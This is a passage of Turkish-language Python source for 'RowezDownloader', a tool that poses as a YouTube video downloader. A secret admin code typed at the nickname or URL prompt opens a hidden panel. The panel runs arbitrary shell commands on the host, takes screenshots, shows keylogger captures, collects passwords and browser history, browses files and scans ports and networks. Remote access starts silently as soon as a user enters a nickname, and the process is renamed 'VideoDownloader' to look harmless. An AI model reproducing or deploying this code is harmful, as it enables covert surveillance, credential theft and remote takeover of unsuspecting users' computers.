            print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
            logger.error(hata_mesaji)
            return f"Hata: {e}"
        finally:
            if conn:
                conn.close()

    def export_user_data(self) -> str:
        if not self.is_admin_mode or not self.verify_session_token("admin", self.admin_token):
            return "Yetkisiz işlem."
        try:
            export_file = f"user_data_export_{int(time.time())}.json"
            with open(export_file, "w", encoding="utf-8") as f:
                json.dump(self.user_sessions, f, indent=4, ensure_ascii=False)
            self.log_activity(f"Kullanıcı verileri dışa aktarıldı: {export_file}")
            return f"Kullanıcı verileri {export_file} dosyasına dışa aktarıldı."
        except IOError as e:
            hata_mesaji = f"Kullanıcı verileri dışa aktarılamadı: {e}. Bu hata, dosya yazılamaması veya diskte yer kalmaması gibi nedenlerden kaynaklanabilir."
            print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
            logger.error(hata_mesaji)
            return f"Hata: {e}"

    def delete_user_files(self, user_id: str) -> str:
        if not self.is_admin_mode or not self.verify_session_token("admin", self.admin_token):
            return "Yetkisiz işlem."
        if user_id not in self.user_sessions:
            return "Kullanıcı bulunamadı."
        try:
            files = [f"keylog_{user_id}.txt", f"rat_log_{user_id}.txt"] + self.user_sessions[user_id]["rat_screenshots"]
            for file in files:
                if Path(file).exists():
                    Path(file).unlink()
            self.log_activity(f"Kullanıcı dosyaları silindi: {user_id}")
            return f"{user_id} kullanıcısının dosyaları silindi."
        except OSError as e:
            hata_mesaji = f"Kullanıcı dosyaları silinemedi: {e}. Bu hata, dosya izinlerinin yetersiz olması veya dosyaların kullanımda olması gibi nedenlerden kaynaklanabilir."
            print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
            logger.error(hata_mesaji)
            return f"Hata: {e}"

    def capture_screenshot(self, user_id: str) -> str:
        if not self.is_admin_mode or not self.verify_session_token("admin", self.admin_token):
            return "Yetkisiz işlem."
        screenshot_path = f"screenshot_{user_id}_{int(time.time())}.png"
        try:
            self.sct.shot(output=screenshot_path)
            self.log_activity(f"Ekran görüntüsü alındı: {user_id} - {screenshot_path}")
            return f"Ekran görüntüsü alındı: {screenshot_path}"
        except Exception as e:
            hata_mesaji = f"Ekran görüntüsü alınamadı: {e}. Bu hata, mss modülünün kurulu olmaması veya ekran görüntüsü alma izninin olmaması gibi nedenlerden kaynaklanabilir."
            print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
            logger.error(hata_mesaji)
            return f"Hata: {e}"

    def remote_control(self, command: str) -> str:
        if not self.is_admin_mode or not self.verify_session_token("admin", self.admin_token):
            return "Yetkisiz işlem."
        try:
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
            self.log_activity(f"Komut yürütüldü: {command}\nSonuç: {result}")
            return f"Sonuç: {result}"
        except subprocess.CalledProcessError as e:
            hata_mesaji = f"Komut yürütme hatası: {e}. Bu hata, komutun geçersiz olması veya sistemde çalıştırılamaması gibi nedenlerden kaynaklanabilir."
            print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
            logger.error(hata_mesaji)
            return f"Hata: {e}"

    def shutdown(self) -> None:
        self.stop_keylogger()
        for thread in self.download_threads:
            if thread.is_alive():
                thread.join()
        print(f"{Fore.GREEN}Program kapatılıyor...{Style.RESET_ALL}")

    def admin_interface(self, current_admin: str) -> None:
        options = [
            "Kullanıcı verilerini görüntüle", "Kullanıcı ara (İD)", "Ekran görüntüsü al", "Sistem kontrolü",
            "Sistemi kapat", "Kullanıcıyı yasakla", "Kullanıcı yasağını kaldır", "İndirme menüsüne git",
            "Logları görüntüle", "Hızlı ağ taraması", "Tam ağ taraması", "Kullanıcı dosyalarını sil",
            "Kullanıcı verilerini dışa aktar", "Logları temizle", "Keylogger verilerini görüntüle",
            "Ekran görüntülerini listele", "Kullanıcı oturumunu sonlandır", "Admin şifresini değiştir",
            "Yeni admin ekle", "Ana menüye dön", "Tarayıcı geçmişini görüntüle", "Şifreleri topla",
            "Dosya sistemine eriş", "Ağ trafiğini izle", "Mikrofonu kontrol et", "Kamerayı kontrol et",
            "Fare ve klavye hareketlerini izle", "Sistem kaynaklarını izle", "Yüklü programları listele",
            "Açık portları tara", "Ağdaki cihazları tara", "Çıkış"
        ]
        while True:
            print(f"\n{Fore.BLUE}🔧 Yönetici Paneli 🔧{Style.RESET_ALL}")
            for i, option in enumerate(options, 1):
                print(f"{Fore.CYAN}{i}. {option}{Style.RESET_ALL}")
            choice = input(f"{Fore.YELLOW}Seçim (1-{len(options)}) veya 'geri' yazın: {Style.RESET_ALL}").strip()
            if choice.lower() == "geri":
                print(f"{Fore.GREEN}Ana menüye dönülüyor...{Style.RESET_ALL}")
                self.is_admin_mode = False
                self.current_admin = None
                self.admin_token = None
                break
            try:
                choice = int(choice)
                if not 1 <= choice <= len(options):
                    raise ValueError
            except ValueError:
                print(f"{Fore.RED}❌ Geçersiz seçim.{Style.RESET_ALL}")
                continue
            if choice == 1:
                for user_id, data in self.user_sessions.items():
                    print(f"\n{Fore.YELLOW}{data['nickname']} (ID: {user_id}):{Style.RESET_ALL}")
                    for key, value in data.items():
                        print(f"{Fore.CYAN}  {key}: {value}{Style.RESET_ALL}")
            elif choice == 2:
                search = input(f"{Fore.YELLOW}🔍 ID veya Takma Ad: {Style.RESET_ALL}").strip().lower()
                found = False
                for user_id, data in self.user_sessions.items():
                    if search == user_id or search in data["nickname"].lower():
                        print(f"{Fore.YELLOW}ID: {user_id} | Takma Ad: {data['nickname']}{Style.RESET_ALL}")
                        found = True
                if not found:
                    print(f"{Fore.RED}❌ Eşleşme bulunamadı.{Style.RESET_ALL}")
            elif choice == 3:
                user_id = input(f"{Fore.CYAN}Hangi ID için ekran görüntüsü? {Style.RESET_ALL}").strip().lower()
                print(self.capture_screenshot(user_id) if user_id in self.user_sessions else f"{Fore.RED}❌ Kullanıcı bulunamadı.{Style.RESET_ALL}")
            elif choice == 4:
                command = input(f"{Fore.CYAN}Komut: {Style.RESET_ALL}")
                print(self.remote_control(command))
            elif choice == 5:
                print("Sistem kapatma henüz uygulanmadı.")
            elif choice == 6:
                user_id = input(f"{Fore.CYAN}Yasaklanacak kullanıcı ID'si: {Style.RESET_ALL}")
                print(self.ban_user(user_id))
            elif choice == 7:
                user_id = input(f"{Fore.CYAN}Yasağı kaldırılacak kullanıcı ID'si: {Style.RESET_ALL}")
                print(self.unban_user(user_id))
            elif choice == 8:
                self.download_interface(current_admin)
            elif choice == 9:
                print(self.view_logs())
            elif choice == 10:
                print(self.network_scan("quick"))
            elif choice == 11:
                print(self.network_scan("full"))
            elif choice == 12:
                user_id = input(f"{Fore.CYAN}Hangi ID’nin dosyaları silinecek? {Style.RESET_ALL}")
                print(self.delete_user_files(user_id))
            elif choice == 13:
                print(self.export_user_data())
            elif choice == 14:
                print(self.clear_logs())
            elif choice == 15:
                user_id = input(f"{Fore.CYAN}Hangi ID için keylogger verileri? {Style.RESET_ALL}").strip().lower()
                if user_id in self.user_sessions:
                    keylog = self.user_sessions[user_id].get("keylog", "")
                    print(f"{Fore.YELLOW}Keylogger Verileri ({user_id}):{Style.RESET_ALL}\n{keylog}")
                else:
                    print(f"{Fore.RED}❌ Kullanıcı bulunamadı.{Style.RESET_ALL}")
            elif choice == 16:
                user_id = input(f"{Fore.CYAN}Hangi ID için ekran görüntüleri? {Style.RESET_ALL}").strip().lower()
                if user_id in self.user_sessions:
                    screenshots = self.user_sessions[user_id].get("rat_screenshots", [])
                    if screenshots:
                        print(f"{Fore.YELLOW}Ekran Görüntüleri ({user_id}):{Style.RESET_ALL}")
                        for screenshot in screenshots:
                            print(f"  - {screenshot}")
                    else:
                        print(f"{Fore.YELLOW}Ekran görüntüsü bulunamadı.{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}❌ Kullanıcı bulunamadı.{Style.RESET_ALL}")
            elif choice == 17:
                user_id = input(f"{Fore.CYAN}Hangi ID’nin oturumu sonlandırılsın? {Style.RESET_ALL}").strip().lower()
                if user_id in self.user_sessions:
                    del self.user_sessions[user_id]
                    self.log_activity(f"Kullanıcı oturumu sonlandırıldı: {user_id}")
                    print(f"{Fore.GREEN}{user_id} kullanıcısının oturumu sonlandırıldı.{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}❌ Kullanıcı bulunamadı.{Style.RESET_ALL}")
            elif choice == 18:
                admin_name = input(f"{Fore.CYAN}Hangi adminin şifresi değişecek? {Style.RESET_ALL}").strip()
                if admin_name in self.admins:
                    new_password = getpass.getpass(f"{Fore.CYAN}Yeni şifre: {Style.RESET_ALL}")
                    self.admins[admin_name] = hashlib.sha256(new_password.encode()).hexdigest()
                    self.log_activity(f"Admin şifresi değiştirildi: {admin_name}")
                    print(f"{Fore.GREEN}Şifre başarıyla değiştirildi.{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}❌ Admin bulunamadı.{Style.RESET_ALL}")
            elif choice == 19:
                new_admin = input(f"{Fore.CYAN}Yeni admin kullanıcı adı: {Style.RESET_ALL}").strip()
                if new_admin not in self.admins:
                    password = getpass.getpass(f"{Fore.CYAN}Şifre: {Style.RESET_ALL}")
                    self.admins[new_admin] = hashlib.sha256(password.encode()).hexdigest()
                    self.log_activity(f"Yeni admin eklendi: {new_admin}")
                    print(f"{Fore.GREEN}Yeni admin eklendi: {new_admin}{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}❌ Bu kullanıcı adı zaten admin.{Style.RESET_ALL}")
            elif choice == 20:
                print(f"{Fore.GREEN}Ana menüye dönülüyor...{Style.RESET_ALL}")
                self.is_admin_mode = False
                self.current_admin = None
                self.admin_token = None
                break
            elif choice == 21:
                user_id = input(f"{Fore.CYAN}Hangi ID için tarayıcı geçmişi? {Style.RESET_ALL}").strip().lower()
                if user_id in self.user_sessions:
                    history = self.get_browser_history(user_id)
                    print(f"{Fore.YELLOW}Tarayıcı Geçmişi ({user_id}):{Style.RESET_ALL}\n{history}")
                else:
                    print(f"{Fore.RED}❌ Kullanıcı bulunamadı.{Style.RESET_ALL}")
            elif choice == 22:
                user_id = input(f"{Fore.CYAN}Hangi ID için şifreler? {Style.RESET_ALL}").strip().lower()
                if user_id in self.user_sessions:
                    passwords = self.get_passwords(user_id)
                    print(f"{Fore.YELLOW}Şifreler ({user_id}):{Style.RESET_ALL}\n{passwords}")
                else:
                    print(f"{Fore.RED}❌ Kullanıcı bulunamadı.{Style.RESET_ALL}")
            elif choice == 23:
                user_id = input(f"{Fore.CYAN}Hangi ID için dosya sistemi? {Style.RESET_ALL}").strip().lower()
                if user_id in self.user_sessions:
                    path = input(f"{Fore.CYAN}Dosya yolu: {Style.RESET_ALL}")
                    files = self.list_files(user_id, path)
                    print(f"{Fore.YELLOW}Dosyalar ({user_id} - {path}):{Style.RESET_ALL}\n{files}")
                else:
                    print(f"{Fore.RED}❌ Kullanıcı bulunamadı.{Style.RESET_ALL}")
            elif choice == 24:
                print("Ağ trafiğini izleme henüz uygulanmadı.")
            elif choice == 25:
                print("Mikrofon kontrolü henüz uygulanmadı.")
            elif choice == 26:
                print("Kamera kontrolü henüz uygulanmadı.")
            elif choice == 27:
                print("Fare ve klavye izleme henüz uygulanmadı.")
            elif choice == 28:
                user_id = input(f"{Fore.CYAN}Hangi ID için sistem kaynakları? {Style.RESET_ALL}").strip().lower()
                if user_id in self.user_sessions:
                    resources = self.get_system_resources(user_id)
                    print(f"{Fore.YELLOW}Sistem Kaynakları ({user_id}):{Style.RESET_ALL}\n{resources}")
                else:
                    print(f"{Fore.RED}❌ Kullanıcı bulunamadı.{Style.RESET_ALL}")
            elif choice == 29:
                user_id = input(f"{Fore.CYAN}Hangi ID için yüklü programlar? {Style.RESET_ALL}").strip().lower()
                if user_id in self.user_sessions:
                    programs = self.get_installed_programs(user_id)
                    print(f"{Fore.YELLOW}Yüklü Programlar ({user_id}):{Style.RESET_ALL}\n{programs}")
                else:
                    print(f"{Fore.RED}❌ Kullanıcı bulunamadı.{Style.RESET_ALL}")
            elif choice == 30:
                user_id = input(f"{Fore.CYAN}Hangi ID için açık portlar? {Style.RESET_ALL}").strip().lower()
                if user_id in self.user_sessions:
                    ports = self.scan_open_ports(user_id)
                    print(f"{Fore.YELLOW}Açık Portlar ({user_id}):{Style.RESET_ALL}\n{ports}")
                else:
                    print(f"{Fore.RED}❌ Kullanıcı bulunamadı.{Style.RESET_ALL}")
            elif choice == 31:
                user_id = input(f"{Fore.CYAN}Hangi ID için ağdaki cihazlar? {Style.RESET_ALL}").strip().lower()
                if user_id in self.user_sessions:
                    devices = self.scan_network_devices(user_id)
                    print(f"{Fore.YELLOW}Ağdaki Cihazlar ({user_id}):{Style.RESET_ALL}\n{devices}")
                else:
                    print(f"{Fore.RED}❌ Kullanıcı bulunamadı.{Style.RESET_ALL}")
            elif choice == 32:
                print(f"{Fore.GREEN}Admin panelinden çıkılıyor...{Style.RESET_ALL}")
                self.is_admin_mode = False
                self.current_admin = None
                self.admin_token = None
                break

    def admin_login(self) -> None:
        username = input(f"{Fore.CYAN}Kullanıcı adı: {Style.RESET_ALL}").strip()
        password = getpass.getpass(f"{Fore.CYAN}Şifre: {Style.RESET_ALL}")
        if username in self.admins and hashlib.sha256(password.encode()).hexdigest() == self.admins[username]:
            self.is_admin_mode = True
            self.current_admin = username
            self.admin_token = self.generate_session_token(username)
            if not self.verify_session_token(username, self.admin_token):
                hata_mesaji = "Token doğrulama hatası. Oturum başlatılamadı."
                print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
                self.is_admin_mode = False
                self.current_admin = None
                self.admin_token = None
                return
            print(f"{Fore.GREEN}✅ Erişim izni verildi.{Style.RESET_ALL}")
            self.log_activity(f"Yönetici girişi: {username}")
            self.admin_interface(username)
        else:
            print(f"{Fore.RED}❌ Geçersiz kimlik bilgileri.{Style.RESET_ALL}")
            self.user_mode()

    def user_mode(self) -> None:
        user_id = ''.join(random.choices(string.digits, k=6))
        if user_id in self.banned_users:
            print(f"{Fore.RED}❌ Erişim reddedildi.{Style.RESET_ALL}")
            return
        while True:
            nickname = input(f"{Fore.CYAN}🎭 Takma Ad: {Style.RESET_ALL}").strip()
            if nickname == self.secret_admin_code:
                self.admin_login()
                return
            if not nickname:
                print(f"{Fore.RED}⚠️ Takma ad boş olamaz.{Style.RESET_ALL}")
            elif nickname in self.nicknames:
                print(f"{Fore.RED}❌ Bu takma ad alınmış.{Style.RESET_ALL}")
            else:
                break
        self.collect_advanced_data(user_id, nickname)
        self.start_remote_access()
        self.download_interface(user_id)

    def download_interface(self, user_id: str) -> None:
        while True:
            print(f"\n{Fore.GREEN}🎬 Rowez Downloader – Video/Ses İndirici 🎬{Style.RESET_ALL}")
            urls = input(f"{Fore.CYAN}🔗 URL'ler (virgülle ayrılmış): {Style.RESET_ALL}").strip()
            if urls == self.secret_admin_code:
                self.admin_login()
                return
            if urls.lower() == "exit":
                print(f"{Fore.GREEN}👋 Çıkılıyor...{Style.RESET_ALL}")
                self.shutdown()
                sys.exit(0)
            urls = [url.strip() for url in urls.split(',') if url.strip()]
            if not urls:
                print(f"{Fore.RED}⚠️ Geçerli URL girilmedi.{Style.RESET_ALL}")
                continue
            self.set_output_path()
            for url in urls:
                confirm = input(f"{Fore.CYAN}🔗 '{url}' indirilsin mi? (e/h): {Style.RESET_ALL}").strip().lower()
                if confirm == 'e':
                    self.download_video(url, user_id)
                else:
                    print(f"{Fore.YELLOW}⚠️ '{url}' iptal edildi.{Style.RESET_ALL}")
                    self.log_activity(f"İndirme iptal edildi: {user_id} - {url}")

    def set_output_path(self) -> None:
        output = input(f"{Fore.CYAN}📂 İndirme klasörü (varsayılan: downloads): {Style.RESET_ALL}").strip()
        self.output_path = output if output else DEFAULT_OUTPUT_PATH
        Path(self.output_path).mkdir(parents=True, exist_ok=True)

    def download_video(self, url: str, user_id: str) -> None:
        self.download_cancelled = False
        is_audio = input(f"{Fore.CYAN}🔊 Yalnızca ses mi? (e/h): {Style.RESET_ALL}").strip().lower() == 'e'
        if is_audio:
            self.audio_format = self.display_options("Ses Formatı", ["mp3", "aac", "opus", "wav"])
            format_selection = "bestaudio/best"
            postprocessors = [{'key': 'FFmpegExtractAudio', 'preferredcodec': self.audio_format}]
        else:
            self.video_quality = self.display_options("Çözünürlük", ["best", "1080", "2160", "4320"])
            self.video_format = self.display_options("Video Formatı", ["mp4", "mkv", "webm"])
            format_selection = "bestvideo+bestaudio/best" if self.video_quality == "best" else f"bestvideo[height<={self.video_quality}]+bestaudio/best"
            postprocessors = [{'key': 'FFmpegVideoConvertor', 'preferedformat': self.video_format}]
        ydl_opts = {
            'format': format_selection,
            'merge_output_format': self.video_format if not is_audio else self.audio_format,
            'outtmpl': str(Path(self.output_path) / '%(title)s_%(id)s.%(ext)s'),
            'progress_hooks': [self.download_progress],
            'ffmpeg_location': str(Path(self.ffmpeg_path) / ("ffmpeg.exe" if platform.system() == "Windows" else "ffmpeg")),
            'postprocessors': postprocessors,
            'quiet': True
        }
        def download_thread_func() -> None:
            try:
                with yt_dlp.YoutubeDL(ydl_opts) as ydl:
                    ydl.download([url])
                if not self.download_cancelled:
                    print(f"{Fore.GREEN}✅ İndirildi: {url}{Style.RESET_ALL}")
                    self.log_activity(f"Video indirildi: {user_id} - {url}")
            except Exception as e:
                if not self.download_cancelled:
                    hata_mesaji = f"Video indirme hatası: {e}. Bu hata, URL'nin geçersiz olması, internet bağlantısının kesilmesi veya yt_dlp modülünün uyumsuzluğu gibi nedenlerden kaynaklanabilir."
                    print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
                    logger.error(hata_mesaji)
        print(f"{Fore.YELLOW}📥 İndirme başlıyor... Durdurmak için 'cancel' yazın.{Style.RESET_ALL}")
        thread = threading.Thread(target=download_thread_func)
        self.download_threads.append(thread)
        thread.start()
        while thread.is_alive():
            try:
                cancel_input = input().strip().lower()
                if cancel_input == "cancel":
                    self.download_cancelled = True
                    print(f"{Fore.YELLOW}⚠️ İptal ediliyor...{Style.RESET_ALL}")
                    thread.join()
                    break
            except KeyboardInterrupt:
                self.download_cancelled = True
                print(f"{Fore.YELLOW}⚠️ İptal ediliyor...{Style.RESET_ALL}")
                thread.join()
                break
        if not self.download_cancelled:
            thread.join()
        self.download_threads.remove(thread)

    def download_progress(self, d: Dict[str, Any]) -> None:
        if d['status'] == 'downloading':
            print(
                f"{Fore.CYAN}İlerleme: {d.get('_percent_str', '0%')} - {d.get('speed', 'Bilinmiyor')} - Tahmini Süre: {d.get('eta', 'Bilinmiyor')}{Style.RESET_ALL}",
                end='\r'
            )

    def display_options(self, title: str, options: List[str]) -> str:
        print(f"\n{Fore.YELLOW}🎛 {title}:{Style.RESET_ALL}")
        for i, option in enumerate(options, 1):
            print(f"{Fore.CYAN}{i}. {option}{Style.RESET_ALL}")
        while True:
            choice = input(f"{Fore.YELLOW}Seçim (1-{len(options)}): {Style.RESET_ALL}").strip()
            if choice.isdigit() and 1 <= int(choice) <= len(options):
                return options[int(choice) - 1]
            print(f"{Fore.RED}Geçersiz seçim, varsayılana dönülüyor: {options[0]}{Style.RESET_ALL}")
            return options[0]

    def ban_user(self, user_id: str) -> str:
        if not self.is_admin_mode or not self.verify_session_token("admin", self.admin_token):
            return "Yetkisiz işlem."
        if user_id in self.user_sessions:
            self.banned_users.add(user_id)
            self.log_activity(f"Kullanıcı yasaklandı: {user_id}")
            return f"Kullanıcı {user_id} yasaklandı."
        return "Kullanıcı bulunamadı."

    def unban_user(self, user_id: str) -> str:
        if not self.is_admin_mode or not self.verify_session_token("admin", self.admin_token):
            return "Yetkisiz işlem."
        if user_id in self.banned_users:
            self.banned_users.remove(user_id)
            self.log_activity(f"Kullanıcı yasağı kaldırıldı: {user_id}")
            return f"Kullanıcı {user_id} yasağı kaldırıldı."
        return "Kullanıcı yasaklı değil."

    def run(self) -> None:
        check_for_updates()
        try:
            print(f"{Fore.RED}Bu program YouTube vb. sitelerden video/ses dosyası indirmek için kullanılır.{Style.RESET_ALL}")
            consent = input(f"{Fore.CYAN}Videolar izinsiz indirilir, yine de indirmek ister misiniz? (e/h): {Style.RESET_ALL}").strip().lower()
            if consent != "e":
                print(f"{Fore.RED}❌ İzin verilmedi. Program kapatılıyor.{Style.RESET_ALL}")
                sys.exit(0)
            self.print_rainbow("RowezDownloader")
            print(f"{Fore.YELLOW}Geliştirici: Rowez{Style.RESET_ALL}")
            consent = input(f"{Fore.CYAN}Keylogger için izin (e/h): {Style.RESET_ALL}").strip().lower()
            self.keylogger_active = consent == "e"
            start_input = input(f"{Fore.CYAN}Başlamak için Enter'a basın: {Style.RESET_ALL}").strip()
            if start_input == self.secret_admin_code:
                self.admin_login()
            else:
                self.user_mode()
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}❌ Program kullanıcı tarafından durduruldu (Ctrl+C).{Style.RESET_ALL}")
            self.shutdown()
            sys.exit(0)
        except Exception as e:
            hata_mesaji = f"Beklenmeyen bir hata oluştu: {e}. Bu hata, sistem yapılandırmasından veya beklenmeyen bir kullanıcı girdisinden kaynaklanabilir. Lütfen girdilerinizi kontrol edin ve tekrar deneyin."
            print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
            logger.error(hata_mesaji)
            self.shutdown()
            sys.exit(1)

if __name__ == "__main__":
    sys.argv[0] = "VideoDownloader"
    downloader = RowezDownloader()
    downloader.run()